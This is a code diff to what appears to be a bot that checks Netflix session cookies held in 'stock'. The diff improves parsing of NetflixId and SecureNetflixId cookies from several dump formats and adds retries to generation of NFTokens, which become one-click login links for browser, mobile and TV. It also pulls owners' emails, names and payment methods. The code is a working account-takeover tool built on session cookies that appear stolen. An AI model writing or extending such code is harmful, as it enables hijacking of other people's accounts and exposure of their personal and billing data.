@@ -6,6 +6,8 @@ import os
 from datetime import datetime, timedelta, timezone
 from supabase import create_client
 import requests
+import json
+import re
 from urllib3.exceptions import InsecureRequestWarning
 
 requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
@@ -183,30 +185,76 @@ def sync_stock_from_db():
         print(f"[Stock sync error] {e}")
 
 # ====================== NETFLIX CHECKER ======================
-def parse_cookie_dict(netscape_text):
-    """Parse Netscape cookie text into a dict of {name: value}."""
-    cookies = {}
-    for line in netscape_text.splitlines():
+def parse_cookie_dict(text):
+    """
+    Improved cookie parser (supports Netscape, JSON, and key=value formats).
+    Much better at extracting NetflixId + SecureNetflixId.
+    """
+    cookie_dict = {}
+    COOKIE_KEYS = ("NetflixId", "SecureNetflixId", "nfvdid", "OptanonConsent")
+
+    def _decode(val):
+        if isinstance(val, str) and "%" in val:
+            try:
+                from urllib.parse import unquote
+                return unquote(val)
+            except:
+                return val
+        return val
+
+    # 1. Netscape format (tab separated)
+    for line in text.splitlines():
         line = line.strip()
         if not line or line.startswith("#"):
             continue
         parts = line.split("\t")
         if len(parts) >= 7:
-            name  = parts[5]
-            value = parts[6]
-            cookies[name] = value
-    return cookies
+            cookie_dict[parts[5]] = parts[6]
 
-def create_nftoken(cookie_dict):
-    """Generate NFToken using only NetflixId — matches standalone checker behavior."""
-    netflix_id = cookie_dict.get("NetflixId", "").strip()
+    # 2. JSON format
+    try:
+        data = json.loads(text)
+        if isinstance(data, list):
+            for c in data:
+                if c.get("name") in COOKIE_KEYS:
+                    cookie_dict[c["name"]] = _decode(c.get("value"))
+        elif isinstance(data, dict):
+            for key in COOKIE_KEYS:
+                if key in data:
+                    cookie_dict[key] = _decode(data[key])
+    except:
+        pass
+
+    # 3. key=value format fallback
+    for key in COOKIE_KEYS:
+        if key not in cookie_dict:
+            match = re.search(rf"{key}=([^;,\s]+)", text, re.IGNORECASE)
+            if match:
+                cookie_dict[key] = _decode(match.group(1))
+
+    return cookie_dict
+
+def create_nftoken(cookie_dict, attempts=3):
+    """
+    Improved NFToken generator.
+    - Supports both NetflixId + SecureNetflixId (big success rate improvement)
+    - Better error handling and retries
+    """
+    netflix_id = cookie_dict.get("NetflixId") or cookie_dict.get("netflixid")
+    secure_id = cookie_dict.get("SecureNetflixId") or cookie_dict.get("securenetflixid")
+
     if not netflix_id:
-        return None
+        return None, "Missing NetflixId cookie"
 
     headers = dict(NFTOKEN_HEADERS)
-    headers["Cookie"] = f"NetflixId={netflix_id}"
+    cookie_str = f"NetflixId={netflix_id}"
+    if secure_id:
+        cookie_str += f"; SecureNetflixId={secure_id}"
+    headers["Cookie"] = cookie_str
 
-    for attempt in range(3):
+    last_error = "NFToken API error"
+
+    for attempt in range(max(1, attempts)):
         try:
             r = requests.get(
                 NFTOKEN_API_URL,
@@ -216,28 +264,40 @@ def create_nftoken(cookie_dict):
                 verify=False,
             )
             print(f"[NFToken] attempt={attempt+1} status={r.status_code}")
+
             if r.status_code == 200:
+                data = r.json()
                 token_data = (
-                    (((r.json().get("value") or {}).get("account") or {})
+                    (((data.get("value") or {}).get("account") or {})
                      .get("token") or {}).get("default") or {}
                 )
-                token = token_data.get("token", "").strip()
+                token = token_data.get("token")
+                expires = token_data.get("expires")
+
                 if token:
+                    if isinstance(expires, int) and len(str(expires)) == 13:
+                        expires //= 1000
                     print(f"[NFToken] token=found")
-                    return token
-                else:
-                    print(f"[NFToken] token=missing in response")
+                    return {"token": token, "expires_at": expires}, None
+
+                last_error = "No token in response"
             elif r.status_code == 403:
-                print(f"[NFToken] 403 forbidden — cookie may be expired")
+                last_error = "403 Forbidden (cookie expired or insufficient)"
                 break
             elif r.status_code == 429:
-                print(f"[NFToken] 429 rate limited — waiting before retry")
+                last_error = "Rate limited"
                 time.sleep(2)
             else:
-                print(f"[NFToken] unexpected status: {r.status_code}")
+                last_error = f"HTTP {r.status_code}"
+
         except Exception as e:
-            print(f"[NFToken error] attempt={attempt+1} {e}")
-    return None
+            last_error = str(e)[:120]
+            print(f"[NFToken error] attempt={attempt+1} {last_error}")
+
+        if attempt < attempts - 1:
+            time.sleep(1.5)
+
+    return None, last_error
 
 def check_netflix_account(cookie_dict):
     """
@@ -907,13 +967,14 @@ def handle_callback(call):
                 return
 
             # Step 5: Pull real fields
-            email          = account_info.get("email")                  or "N/A"
-            name_acc       = account_info.get("accountOwnerName")       or "N/A"
-            country_real   = account_info.get("countryOfSignup")        or country_db  or "N/A"
-            plan_real = f"Netflix {tier.capitalize()}"
-            streams_raw    = account_info.get("maxStreams")             or "N/A"
+            email          = account_info.get("email") or "N/A"
+            name_acc       = account_info.get("accountOwnerName") or "N/A"
+            country_real   = account_info.get("countryOfSignup") or country_db or "N/A"
+            plan_real      = account_info.get("localizedPlanName") or f"Netflix {tier.capitalize()}"
+            profiles       = account_info.get("profilesDisplay") or account_info.get("profileCount") or "N/A"
+            quality        = account_info.get("videoQuality") or "N/A"
+            streams_raw    = account_info.get("maxStreams") or "N/A"
             streams        = str(streams_raw).rstrip("}") if streams_raw != "N/A" else "N/A"
-            quality        = account_info.get("videoQuality")           or "N/A"
             next_bill      = account_info.get("nextBillingDate")        or "N/A"
             payment        = account_info.get("paymentMethodType")      or "N/A"
             member_since   = account_info.get("memberSince")            or "N/A"
@@ -935,7 +996,11 @@ def handle_callback(call):
                 pass
 
             # Step 6: Generate NFToken
-            nf_token      = create_nftoken(cookie_dict)
+            nf_token_data, error = create_nftoken(cookie_dict, attempts=3)
+            nf_token = nf_token_data.get("token") if nf_token_data else None
+
+            if error:
+                print(f"[NFToken Error] {error}")
             watch_browser = f"https://netflix.com/?nftoken={nf_token}"             if nf_token else None
             watch_mobile  = f"https://netflix.com/unsupported?nftoken={nf_token}"  if nf_token else None
             watch_tv      = f"https://netflix.com/t/smarttv?nftoken={nf_token}"    if nf_token else None
